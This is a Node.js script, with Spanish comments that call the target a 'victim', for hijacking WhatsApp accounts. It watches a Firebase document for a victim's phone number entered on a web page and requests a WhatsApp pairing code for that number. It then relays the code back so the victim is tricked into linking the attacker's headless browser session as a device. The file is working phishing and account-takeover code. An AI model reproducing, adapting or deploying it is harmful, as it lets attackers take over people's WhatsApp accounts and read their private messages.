const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process'],
        executablePath: '/usr/bin/google-chrome-stable'
    }
});

// ESCUCHAR CUANDO LA VÍCTIMA PONE SU NÚMERO EN LA WEB
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    const data = snap.data();
    if (data && data.numero_victima && data.status === "solicitando_codigo") {
        console.log("Solicitando código para:", data.numero_victima);
        try {
            // SOLICITAR CÓDIGO DE 8 DÍGITOS A WHATSAPP
            const pairingCode = await client.requestPairingCode(data.numero_victima);
            console.log("CÓDIGO GENERADO:", pairingCode);
            
            // SUBIR CÓDIGO A FIREBASE
            await snap.ref.update({
                pairingCode: pairingCode,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.error("Error al pedir código:", err);
        }
    }
});

client.on('ready', () => {
    console.log('¡SESIÓN VINCULADA CON ÉXITO!');
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();

http.createServer((req, res) => { res.end('MOTOR PAIRING ONLINE'); }).listen(process.env.PORT || 3000);
